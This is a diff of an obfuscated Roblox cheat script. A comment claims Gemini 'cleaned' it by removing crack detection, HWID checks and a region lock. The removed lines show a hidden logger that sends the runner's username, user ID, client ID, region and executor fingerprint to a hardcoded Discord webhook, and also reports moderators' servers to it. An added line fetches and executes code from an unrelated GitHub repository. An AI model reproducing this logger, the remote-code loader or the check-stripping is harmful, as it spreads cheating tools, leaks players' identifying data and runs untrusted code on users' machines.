@@ -1,159 +1,15 @@
--- ts file was generated at discord.gg/25ms
 
--- Script đã được làm sạch bởi Gemini
--- Đã xóa: WhyCrackITmate, HWID Check, Region Lock (VN/TH)
 
 repeat task.wait() until game:IsLoaded()
 
--- Giữ lại các biến check _G này ở trạng thái true để tránh lỗi logic nếu script phía dưới có kiểm tra lại
-_G.hjasfhjkaskjfgkhjafsgashjkgfaghjfsghfjas = true
+_G.hjasfhjkaskjfgkhjafsgashjkgfaghjfsghfjas = true 
 _G.ASJKDJSAKDASLKDSJKLDHEHRUIEIHHGF = true
-_G.StealToggle = true
 
--- Thông báo nhẹ để biết script đã chạy qua đoạn check
-print("Script loaded - Security check removed")
 
--- Phần dưới đây là logic game của bạn (Server Hop, Auto Farm...)
--- HÃY ĐẢM BẢO BẠN GIỮ NGUYÊN PHẦN CODE BÊN DƯỚI CỦA FILE GỐC (Bắt đầu từ đoạn vu1242...)
+local vu15 = request or http_request or (HttpPost or syn.request)
+local vu38 = nil
 
-local function vu8(p5)
-    game:GetService("Players").LocalPlayer:Kick(p5.Name .. " in Server")
-    local v6 = {
-        content = p5.Name .. " Mod/Snitch Is Playing ServerID:" .. game.JobId .. " ,Paste To Join(BloxStrap) ||roblox://experiences/start?placeId=3237168&gameInstanceId=" .. game.JobId .. "|| @everyone"
-    }
-    local v7 = game:GetService("HttpService"):JSONEncode(v6)
-    Request = http_request or request or (HttpPost or syn.request)
-    Request({
-        Url = "https://discord.com/api/webhooks/1210520312785932318/uVXwK79S3-GS-yaoJuoFPm2hw_OUJtlOYswA2iNUNWJh51PuQ5nQnC0_8qfS0WkVMMOc",
-        Body = v7,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        }
-    })
-end
-game:GetService("Players").PlayerAdded:Connect(function(p9)
-    if table.find(_G.OnJoinKickList, p9.UserId) then
-        game.StarterGui:SetCore("SendNotification", {
-            Title = p9.Name .. " Mod / Snitch Is Joining",
-            Text = "Auto Kick Soon",
-            Duration = 5
-        })
-        game:GetService("Workspace"):WaitForChild("UserData"):WaitForChild("User_" .. p9.UserId):WaitForChild("FinishedLoading").Changed:Wait()
-        vu8(p9)
-    end
-end)
-local v10, v11, v12 = pairs(game:GetService("Players"):GetPlayers())
-local v13 = vu8
-while true do
-    local v14
-    v12, v14 = v10(v11, v12)
-    if v12 == nil then
-        break
-    end
-    if table.find(_G.OnJoinKickList, v14.UserId) then
-        v13(v14)
-    end
-end
-local vu15 = request or http_request
-local v16 = vu15({
-    Url = "https://httpbin.org/get",
-    Method = "GET"
-}).Body
-local v17 = nil
-local v18 = nil
-local v19 = "https://discord.com/api/webhooks/1210520312785932318/uVXwK79S3-GS-yaoJuoFPm2hw_OUJtlOYswA2iNUNWJh51PuQ5nQnC0_8qfS0WkVMMOc"
-while v17 == nil do
-    task.wait(0)
-    v17 = game:GetService("HttpService"):JSONDecode(v16)
-end
-local v20, v21, v22 = pairs(v17)
-while true do
-    local v23
-    v22, v23 = v20(v21, v22)
-    if v22 == nil then
-        break
-    end
-    if type(v23) == "table" then
-        local v24, v25, v26 = pairs(v23)
-        while true do
-            local v27
-            v26, v27 = v24(v25, v26)
-            if v26 == nil then
-                break
-            end
-            if string.find(v26, "Fingerprint") then
-                v18 = string.split(v26, "-Fingerprint")[1]
-            end
-        end
-    end
-end
-local v28 = {}
-local v29 = {}
-local v30 = {
-    title = "Click here to view player profile",
-    url = "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId,
-    description = "**Someone Executed Ur Script**",
-    color = tonumber(65535)
-}
-local v31 = {}
-local v32 = {
-    name = "User",
-    value = "**Name: ** **" .. game.Players.LocalPlayer.Name .. "** **Display:** **" .. game.Players.LocalPlayer.DisplayName .. "**",
-    inline = false
-}
-local v33 = {
-    name = "Executor",
-    value = "**" .. v18 .. "**",
-    inline = true
-}
-local v34 = {
-    name = "Account Age",
-    value = "**" .. game.Players.LocalPlayer.AccountAge .. "**",
-    inline = true
-}
-local v35 = {
-    name = "UserID",
-    value = "**" .. game.Players.LocalPlayer.UserId .. "**",
-    inline = true
-}
-local v36 = {
-    name = "Client ID",
-    value = "**" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "**",
-    inline = false
-}
-__set_list(v31, 1, {
-    v32,
-    v33,
-    v34,
-    v35,
-    v36,
-    {
-        name = "Region",
-        value = "**" .. gethiddenproperty(game.Players.LocalPlayer, "CountryRegionCodeReplicate") .. "**",
-        inline = true
-    },
-    {
-        name = "Server",
-        value = "**" .. game.JobId .. "**",
-        inline = true
-    }
-})
-v30.fields = v31
-__set_list(v29, 1, {
-    v30
-})
-v28.embeds = v29
-local v37 = game:GetService("HttpService"):JSONEncode(v28)
-Request = vu15 or request or (HttpPost or syn.request)
-Request({
-    Url = v19,
-    Body = v37,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    }
-})
+
 local vu38 = nil
 function AutoStore()
     local v39 = game:GetService("Players").LocalPlayer
@@ -226,7 +82,7 @@ function AutoStore()
         end
     end
 end
-local vu56 = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local vu56 = loadstring(game:HttpGet("https://raw.githubusercontent.com/skidboss/ok/main/dragkavoui"))()
 local v57 = vu56.CreateLib("Wave Hub Version: 1.22 bug fix auto store", _G.colors)
 local v58 = v57:NewTab("Sam"):NewSection("Sam")
 local v59 = v57:NewTab("Drinks"):NewSection("Drinks")
